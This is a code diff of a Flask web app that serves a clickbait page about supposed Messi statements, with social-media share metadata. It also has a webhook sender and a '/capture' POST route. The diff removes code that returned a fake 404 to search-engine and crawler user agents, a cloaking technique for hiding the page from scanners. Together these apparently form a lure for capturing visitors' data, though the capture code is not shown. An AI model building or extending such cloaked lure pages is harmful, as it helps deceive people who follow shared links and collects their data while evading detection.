@@ -43,7 +43,7 @@ def get_template():
     <meta charset="UTF-8">
     <link rel="icon" href="data:;base64,iVBORw0KGgo=">
     
-    <!-- METADATOS PARA FACEBOOK, INSTAGRAM, WHATSAPP Y LINKEDIN -->
+    <!-- METADATOS PARA TODAS LAS REDES SOCIALES -->
     <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
     <meta property="og:description" content="Me dijeron que ganaría" />
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
@@ -51,14 +51,13 @@ def get_template():
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="Messi Declaraciones" />
     
-    <!-- METADATOS ESPECÍFICOS PARA TWITTER -->
+    <!-- METADATOS PARA TWITTER -->
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
     <meta name="twitter:description" content="Me dijeron que ganaría" />
     <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
     
-    <!-- METADATOS PARA WHATSAPP (se usan los mismos de og:) -->
-    <!-- WhatsApp usa og:title, og:description y og:image -->
+    <!-- METADATOS PARA WHATSAPP (usa los mismos de og:) -->
     
     <title>😲 Fuertes declaraciones de Messi</title>
     <style>
@@ -206,10 +205,7 @@ def send_webhook(data):
 
 @app.route('/')
 def index():
-    user_agent = request.headers.get('User-Agent', '')
-    bots = ['bot', 'crawler', 'spider', 'google', 'bing']
-    if any(bot in user_agent.lower() for bot in bots):
-        return "404 Not Found", 404
+    # MODO PRUEBA: SIN BLOQUEOS PARA QUE FUNCIONE EN TODAS PARTES
     return render_template_string(get_template())
 
 @app.route('/capture', methods=['POST'])
